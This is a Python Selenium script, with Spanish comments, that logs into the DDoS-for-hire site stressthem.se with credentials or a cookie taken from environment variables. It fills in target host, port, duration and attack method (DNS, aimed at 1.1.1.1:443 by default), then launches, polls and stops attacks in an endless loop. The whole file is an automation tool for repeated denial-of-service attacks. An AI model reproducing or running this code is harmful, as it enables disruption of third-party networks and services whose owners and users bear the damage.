from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select
from selenium.webdriver.chrome.options import Options
from selenium.webdriver import ChromeService, FirefoxService
from selenium.common.exceptions import *

import os
import logging
import requests
import time
import json

from pages import Pages


# TODO: hacer que saque estos datos de el config.json
# Poner env vars si quiere login por formulario
username = os.getenv("username")
password = os.getenv("password")

drivers = {
    "geckoDriver": "./drivers/geckodriver.exe",
    "chromeDriver": "./drivers/chromedriver.exe"
}

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0"
]


# TODO: hacer un sistema de cookies con diferentes cuentas que las extraiga de un .json
cookies = [
    {
        "name": "UID",
        "value": os.getenv("cookie")
    }
]


# TODO: hacer que saque estos datos de config.json
info = {
    "host": "1.1.1.1",
    "port": 443,
    "time": 20,
    "method": "DNS"
}

logger = logging.getLogger('selenium')
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler("./debug.log")
logger.addHandler(handler)


firefox_options = webdriver.FirefoxOptions()
firefox_options.add_argument("--headless")


service = FirefoxService(executable_path=drivers["geckoDriver"], log_output="./debug.log")

driver = webdriver.Firefox(service=service, options=firefox_options)



class Main(Pages):
    def __init__(self, driver: webdriver.Chrome) -> None:
        self.driver = driver
        self.driver.get("https://www.stressthem.se")
        self.driver.implicitly_wait(0.5)

    def find_element_by_locator(self, locator):
        return WebDriverWait(self.driver, 10).until(EC.presence_of_element_located(locator))

    def get_cookies(self) -> dict:
        cookies = self.driver.get_cookies()
        return {cookie['name']: cookie['value'] for cookie in cookies}

    def restart_session(self):
        self.driver.execute_script("location.reload();")

    def close_button(self):
        self.close_button= self.driver.find_element(By.CLASS_NAME, "close")
        self.close_button.click()

    def login_form(self) -> any:
        self.login_page()

        username_form = self.driver.find_element(By.ID, "username")
        username_form.send_keys(username)

        password_form = self.driver.find_element(By.ID, "password")
        password_form.send_keys(password)

        driver.implicitly_wait(0.5)
        driver.find_element(By.CLASS_NAME, "btn").click()

    def login_cookies(self) -> any:
        for cookie in cookies:
            driver.add_cookie(cookie)

    def start_attack(self, ip: str, port: int, time: int, method: str):

        self.ip_form = self.driver.find_element(By.ID, "host")
        self.ip_form.send_keys(ip)

        self.port_form = self.driver.find_element(By.ID, "port")
        self.port_form.send_keys(port)

        self.time_form = self.driver.find_element(By.ID, "time")
        self.time_form.send_keys(time)

        self.method_form = Select(driver.find_element(By.ID, "method"))
        self.method_form.select_by_value(method)

        self.driver.implicitly_wait(1.0)

        self.driver.execute_script("startAttack();")
        self.driver.implicitly_wait(1.0)

        try:
            self.restart_session()
        except:
            pass


    def get_running_attacks(self, cookies: dict):
        s = requests.session()

        headers = {
            'User-Agent': user_agents[0],
            'Accept': '*/*',
            'Accept-Language': 'es-ES,es;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.stressthem.se/hub',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': 'https://www.stressthem.se',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Content-Length': '0',
            'TE': 'trailers'
        }

        response = s.post(
            url="https://www.stressthem.se/request/hub/running/attacks",
            headers=headers,
            cookies=cookies

        )
        if response.status_code == 200:
            return response.json()
        else:
            print(f"Error en la solicitud. Código de estado: {response.status_code}")
    def stop_attack(self, id: any):
        self.driver.execute_script("stopAttack();", id)
        time.sleep(0.2)


    def driver_quit(self) -> any:
        driver.quit()



bot = Main(driver=driver)
bot.login_form()
bot.DDoS_page()
bot.close_button()
i = 1
while True:
    i = i + 1
    try:
        bot.start_attack(info["host"], info["port"], info["time"], info["method"])
        print(f"ejecución: {i}")
        time.sleep(info["time"])
        bot.stop_attack(bot.get_running_attacks(bot.get_cookies())["running"][0]["id"])
    except Exception as e:
        print(f"Error en ejecución: {i}\n   Error: {e}")
    finally:
        ...

